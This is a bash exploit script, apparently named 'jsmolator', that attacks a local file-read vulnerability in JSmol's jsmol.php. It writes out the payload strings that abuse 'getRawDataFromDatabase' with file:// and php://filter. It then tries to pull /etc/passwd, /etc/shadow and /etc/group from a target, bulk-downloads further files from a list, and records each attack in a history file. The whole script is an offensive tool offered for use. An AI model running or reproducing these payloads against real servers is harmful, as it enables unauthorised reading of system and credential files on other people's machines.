#!/bin/bash
#############################################################################################
# CHORFA A.
# dino213DZ@gmail.com
# https://github.com/dino213dz/jsmolator
# V 1.0 08.02.2020
# V 1.1 09.02.2020
# V 1.2 10.02.2020
# V 1.3 11.02.2020
# V 1.4 11.02.2020
script_version='1.4'
#############################################################################################
# INCLUDES
#############################################################################################
script_path=$(echo "$0"|rev|cut -d '/' -f 2-|rev )
cd $script_path
script_configuration_files=( 'jsmolator.conf' 'jsmolator.fct')
for source_file in ${script_configuration_files[*]};do
	if [ ! -e "$source_file" ];then
		echo -e "ERROR:\tConfiguration file missing: <$script_path/$source_file> "
		exit 1;
	else
		source "$source_file"
	fi
done
#############################################################################################
# attack params
#############################################################################################

jsmolphp_url="$1"
payload_txt='call=getRawDataFromDatabase&query=file://'
payload_b64='isform=true&call=getRawDataFromDatabase&source=post_page---------------------------&query=php://filter/resource='

#############################################################################################
# WORKING VARS
#############################################################################################
question_attack_again='YES'
continue_tests='TRUE'
is_vuln='FALSE'
payload_types=('TXT' 'B64')
functionnal_payload=''
got_passwd='FALSE'
got_shadow='FALSE'
got_group='FALSE'
downloaded_files_list=''
total_downloaded_files_real_path_list=''
total_downloaded_files=0
target_test_files='/etc/passwd /etc/shadow /etc/group' #searching for 'root:' !!!!DO NOT EDIT !!!!!

#############################################################################################
# CHECKINGS
#############################################################################################
#check parameters


#check download files list
if [ ! -e "$dl_list_file" ];then
	echo -e "ERROR:\tDownload file list wasn't found there: $dl_list_file"
	echo -e "CONFIG:\t Check the configuration file <jsmolator.conf> and verify the parameter 'dl_list_file='"
	exit 2;
fi

#check target
if [ ${#jsmolphp_url} -eq 0 ];then
	echo -e "ERROR:\tTarget missing"
	echo -e "USAGE:\t$0 '[http://target/uri/till/jsmol.php]'"
	exit 3;
else
	#check target parameter
	ceck_target_syntax=$(checkTarget)
	if [ "$ceck_target_syntax" != 'OK' ];then
		echo -e "ERROR:\tTarget is wrong. $ceck_target_syntax"
		echo -e "USAGE:\t$0 '[http://target/uri/till/jsmol.php]'"
		exit 4
	fi
fi

#dynamic vars
download_files=$(cat "$dl_list_file"|egrep -v "^#")
total_files_to_dl=$(cat $dl_list_file|egrep -v "^#"|wc -l)
attack_date_start=$(/bin/date "+%s")


#############################################################################################
# STARTING
#############################################################################################
#start
showBanner

#show infos
touch "$curl_output_filename"
showTitle "Attack information" "" "0"
showTitle "Target" "$jsmolphp_url" "1"
showTitle "Download folder" "$download_folder" "1"
showTitle "List of files to download" "$dl_list_file" "1"
history_datas=$(readFromHistory "$jsmolphp_url")
if [ ${#history_datas} -gt 0 ];then
	hist_vulnerable=$(historyData 'vulnerable')
	hist_payload=$(historyData 'payload')
	hist_payload_name=$(echo "$hist_payload"|sed 's/B64/Base64/g'|sed 's/TXT/Text/g')
	hist_passwd=$(historyData 'passwd')
	hist_shadow=$(historyData 'shadow')
	hist_group=$(historyData 'group')
	hist_date=$(historyData 'date')
	hist_duration=$(historyData 'duration')
	showTitle "History check" "Found" "1"
	showTitle "Is Vulnerable" "$hist_vulnerable" "2"
	showTitle "Payload used" "$hist_payload_name" "2"
	showTitle "Date of attack" "$hist_date" "2"
	showTitle "Attack duration" "$hist_duration" "2"
	showTitle "Important files" "" "2"
	showTitle "Got $c_submain/etc/passwd$c_reset$c_main" "$hist_passwd" "3"
	showTitle "Got $c_submain/etc/shadow$c_reset$c_main" "$hist_shadow" "3"
	showTitle "Got $c_submain/etc/group$c_reset$c_main" "$hist_group" "3"
	if [ "$mode_interact" = 'ON' ];then
		showTitle "Attack again? [${c_submain}Y/N$c_reset$c_main]" "" "0" "NoNL"
		echo -en "$c_warn";
		read question_attack_again
	fi
else
	question_attack_again='YES'
fi

#############################################################################################
# EXPLOIT CHECK
#############################################################################################
if [ "$question_attack_again" != "no" ] && [ "$question_attack_again" != "NO" ] && [ "$question_attack_again" != "n" ] && [ "$question_attack_again" != "N" ];then
	showTitle "Attacking" "" "0"
	echo ''
	for target_test_filename in ${target_test_files[*]};do
		for payload_test in ${payload_types[*]};do
			#try payload
			payload_name=$(echo "$payload_test"|sed 's/B64/Base64/g'|sed 's/TXT/Text/g')
			showTitle "Getting $c_submain$target_test_filename$c_reset$c_main using payload type" "$payload_name" "1" "" "XMODE" 
			checkFile "$target_test_filename" "$payload_test"
			#debug result : 
			if [ "$mode_debug" = "ON" ];then
				showTitle "Curl Response" "" "2"
				echo -en "$c_text"
				cat "$curl_output_filename" 
				echo -e "$c_reset"
			fi
		done
		if [ $continue_tests != "TRUE" ];then
			showTitle "Success" "Payload $payload_name works well!" "2"
			break
		fi
	done

#############################################################################################
# EXPLOIT RESULT
#############################################################################################
	showTitle "Results" "" "0"
	if [ $is_vuln = "TRUE" ];then
		showTitle "$target_result_title_is_vulnerable" "$c_warn""$target_result_text_is_vulnerable" "1"
		#check important files			
		gotImportantFiles "$dl_sub_folder"
		if [ "$mode_interact" = 'ON' ];then
			showTitle "Download files in list?  [$c_submain$total_files_to_dl total$c_reset$c_main] [${c_submain}Y/N$c_reset$c_main]" "" "0" "NoNL"
			echo -en "$c_warn";
			read question_dl_files
		fi
		if [ "$question_dl_files" != "no" ] && [ "$question_dl_files" != "NO" ] && [ "$question_dl_files" != "n" ] && [ "$question_dl_files" != "N" ];then
			#convert target domaine to folder
			dl_sub_folder=$(echo "$jsmolphp_url"|cut -d '/' -f 3)
			showTitle "Preparing downlods" "" "1"
			#create download folder
			showTitle "Checking download folders" "" "2"
			checkFolders "$dl_sub_folder"
			#dl files
			downloadFiles "$dl_sub_folder"

			#dl more files ?
			downloadMoreFiles "$dl_sub_folder"
			
			#list downloads
			listDownloadedFiles "$dl_sub_folder"		
			#search tags in files
			searchTagsMode
		fi
	else
		showTitle "$target_result_title_not_vulnerable" "$c_error""$target_result_text_not_vulnerable" "1"
	fi
	#logging in history file
	attack_date_end=$(/bin/date "+%s")
	attack_duration=$(( $attack_date_end-$attack_date_start ))
	attack_duration_txt=$( secondsToTime "$attack_duration" )
	saveToHistory
	showTitle "Attack duration" "${attack_duration_txt}" "0"
else
	showTitle "Attack canceled" "" "4"
fi
#############################################################################################
# END
#############################################################################################
showTitle "Quitting" "" "0"
showTitle "Remove temporary files" "" "1"
rm -f "$curl_output_filename" 2>/dev/null 1>/dev/null
cd $OLDPATH
showTitle "Bye" "" "1"
echo -en "$c_reset"
exit 0
